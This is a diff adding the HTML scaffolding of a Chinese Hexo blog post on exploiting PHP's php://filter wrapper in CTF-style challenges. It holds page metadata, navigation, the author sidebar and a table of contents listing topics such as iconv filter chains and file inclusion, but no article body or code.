@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hah.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="对php的filter过滤器利用的总结最近打比赛都遇到了这种考点，这里在学习后总结一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="filter过滤器利用总结">
+<meta property="og:url" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Fupanc">
+<meta property="og:description" content="对php的filter过滤器利用的总结最近打比赛都遇到了这种考点，这里在学习后总结一下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png">
+<meta property="article:published_time" content="2024-05-27T14:18:49.932Z">
+<meta property="article:modified_time" content="2024-05-27T14:24:48.764Z">
+<meta property="article:author" content="Fupanc">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png">
+
+
+<link rel="canonical" href="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/","path":"2024/05/27/对php的filter过滤器利用的总结/","title":"filter过滤器利用总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>filter过滤器利用总结 | Fupanc</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Fupanc</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">对php的filter过滤器利用的总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9php-filter%E7%9A%84%E8%AF%B4%E6%98%8E"><span class="nav-number">1.0.1.</span> <span class="nav-text">对php:&#x2F;&#x2F;filter的说明</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%B4%E6%98%8E"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">基本说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">基本使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%87%8D%E8%A6%81%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">1.0.1.0.3.</span> <span class="nav-text">重要过滤器</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#string-strip-tags%EF%BC%9A"><span class="nav-number">1.0.1.0.3.1.</span> <span class="nav-text">string.strip_tags：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#convert-iconv"><span class="nav-number">1.0.1.0.3.2.</span> <span class="nav-text">convert.iconv.*:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B0%8F%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.1.0.3.3.</span> <span class="nav-text">小绕过</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%9D%A5%E2%80%99%E6%A8%A1%E7%B3%8A%E2%80%99%E4%BB%A3%E7%A0%81"><span class="nav-number">1.0.2.</span> <span class="nav-text">利用编码解码来’模糊’代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8base64%E7%BC%96%E7%A0%81"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">利用base64编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8rot13%E7%BC%96%E7%A0%81"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">利用rot13编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">利用字符串操作方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%8F%98%E5%BD%A2bypass"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">代码变形bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bypass%E7%9B%B8%E5%90%8C%E5%8F%98%E9%87%8F"><span class="nav-number">1.0.2.4.1.</span> <span class="nav-text">bypass相同变量</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#base64"><span class="nav-number">1.0.2.4.1.1.</span> <span class="nav-text">base64</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#rot13%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.2.4.1.2.</span> <span class="nav-text">rot13绕过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#convert-iconv-1"><span class="nav-number">1.0.2.4.1.3.</span> <span class="nav-text">convert.iconv.*</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8filter-chain%E7%94%9F%E6%88%90%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6"><span class="nav-number">1.0.3.</span> <span class="nav-text">利用filter chain生成任意字符</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-temp"><span class="nav-number">1.0.3.0.1.</span> <span class="nav-text">php:&#x2F;&#x2F;temp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0"><span class="nav-number">1.0.3.0.2.</span> <span class="nav-text">如何构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="nav-number">1.0.3.0.3.</span> <span class="nav-text">如何利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%94%A8%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.0.3.0.3.1.</span> <span class="nav-text">用于文件包含</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%94%A8%E4%BA%8E%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.0.3.0.3.2.</span> <span class="nav-text">用于构造任意字符串</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fupanc"
+      src="/images/index.jpg">
+  <p class="site-author-name" itemprop="name">Fupanc</p>
+  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/index.jpg">
+      <meta itemprop="name" content="Fupanc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fupanc">
+      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="filter过滤器利用总结 | Fupanc">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          filter过滤器利用总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-05-27 22:18:49 / 修改时间：22:24:48" itemprop="dateCreated datePublished" datetime="2024-05-27T22:18:49+08:00">2024-05-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/php%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">php相关漏洞</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/php%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">对php的filter过滤器利用总结</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>24 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
